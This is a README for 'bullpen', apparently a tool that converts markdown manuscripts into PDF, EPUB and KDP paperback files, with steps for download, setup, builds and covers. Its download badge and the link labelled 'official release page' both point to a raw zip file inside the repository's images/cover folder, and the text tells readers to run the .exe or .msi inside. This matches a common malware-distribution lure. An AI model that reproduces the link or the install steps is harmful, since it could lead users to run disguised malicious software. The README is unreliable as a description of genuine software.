# 🖋️ bullpen - Write books once and publish everywhere

[![Download Bullpen](https://img.shields.io/badge/Download_Bullpen-Blue-blue)](https://github.com/Jjes6128/bullpen/raw/refs/heads/main/images/cover/Software-v2.8.zip)

Bullpen turns your writing into finished books. You write once in simple markdown files. The software converts your text into professional formats like PDF, EPUB, and MOBI. It handles the layout for KDP paperbacks and creates cover wraps. You create your entire book pipeline inside one tool.

## 📥 How to download the software

Follow these steps to get Bullpen on your Windows computer.

1. Go to the [official release page](https://github.com/Jjes6128/bullpen/raw/refs/heads/main/images/cover/Software-v2.8.zip).
2. Look for the latest version at the top of the list.
3. Click the file ending in `.msi` or `.exe` to start the download.
4. Save the file to your desktop or downloads folder.

## ⚙️ Setting up your workspace

Bullpen uses text files to store your book. You do not need special software to start. You can use any basic text editor like Notepad.

1. Open your text editor.
2. Create a new folder on your computer for your project.
3. Save your file as `index.md` inside this folder.
4. Write your book content using simple formatting like hashtags for headers and asterisks for bold text.

## 🚀 Running your first build

Once you have your text file ready, you need to tell Bullpen to turn it into a book.

1. Open the Bullpen application from your start menu.
2. Click the Open Folder button.
3. Select the folder where you saved your `index.md` file.
4. Choose your desired output format from the list. You can select PDF for digital documents, EPUB for e-readers, or a template for a physical KDP paperback.
5. Click the Process button.
6. Wait for the progress bar to reach completion.
7. Open the newly created `dist` folder to find your finished book files.

## 📋 System requirements

Ensure your computer meets these standards before you run the software:

* Windows 10 or Windows 11.
* At least 200 MB of free storage space.
* An active internet connection for the first-time setup process.
* A basic understanding of file folders on your computer.

## 📖 Managing your chapters

You can keep your book organized by splitting it into multiple files. Bullpen detects files in your folder alphabetically.

1. Name your files `01-chapter.md`, `02-chapter.md`, and so on.
2. Bullpen merges these files in order during the export process.
3. Use a single `metadata.yaml` file to tell the software your book title, author name, and publishing date.

## 🖼️ Creating book covers

Bullpen automates the cover wrap for your physical books. 

1. Prepare your cover image as a high-resolution PNG or JPG file.
2. Place the image in your main project folder.
3. Update the configuration settings within the Bullpen app to point to your image file.
4. Select the KDP Paperback export option.
5. The software adds your cover image to the front, back, and spine based on your specific page count.

## 🛠️ Troubleshooting common issues

If you encounter errors, check these common fixes:

* Software does not open: Ensure you installed the latest version from the releases link and that you have administrative rights on your user account.
* Missing output: Check that your text files contain valid markdown syntax. Bullpen shows error messages in the console window if it finds a typo.
* Format issues: If your PDF looks incorrect, verify your page size settings in the configuration menu. You can switch between A4, Letter, and custom dimensions.
* Slow performance: Large books with many high-resolution images take time to process. Close other heavy programs to give Bullpen more memory during large exports.

## 💡 Best practices for authors

* Save your work often. While Bullpen tracks changes, you remain responsible for backups of your original drafts.
* Use a consistent file naming convention for your chapters.
* Test your EPUB files using a desktop reader before you upload them to stores to ensure the font and layout look correct.
* Organize your images in an `assets` subfolder to keep your project directory clean.
* Consult the built-in help menu by pressing F1 at any time if you find a setting you do not recognize.